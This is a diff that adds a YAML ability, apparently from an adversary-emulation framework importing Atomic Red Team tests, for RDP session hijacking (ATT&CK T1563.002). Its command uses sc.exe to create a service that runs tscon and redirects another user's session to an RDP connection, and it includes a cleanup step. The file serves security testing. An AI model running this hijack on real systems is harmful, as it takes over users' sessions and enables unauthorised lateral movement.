@@ -1,0 +1,38 @@
+- id: a37ac520-b911-458e-8aed-c5f1576d9f46
+  name: RDP hijacking
+  description: '[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+    - how to hijack RDS and RemoteApp sessions transparently to move through an organization'
+  tactic: lateral-movement
+  technique:
+    attack_id: T1563.002
+    name: 'Remote Service Session Hijacking: RDP Hijacking'
+  platforms:
+    windows:
+      sh:
+        command: query user; sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337
+          /dest:rdp-tcp#55"; net start sesshijack
+        cleanup: sc.exe delete sesshijack >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1563.002
+  - lateral-movement
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      Session_ID:
+        description: The ID of the session to which you want to connect
+        type: string
+        default: '1337'
+      Destination_ID:
+        description: Connect the session of another user to a different session
+        type: string
+        default: rdp-tcp#55
+    technique_created: '2020-02-25T18:35:42.765Z'
+    atomic_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
+    import_timestamp: '2025-06-24T11:15:06.011910Z'
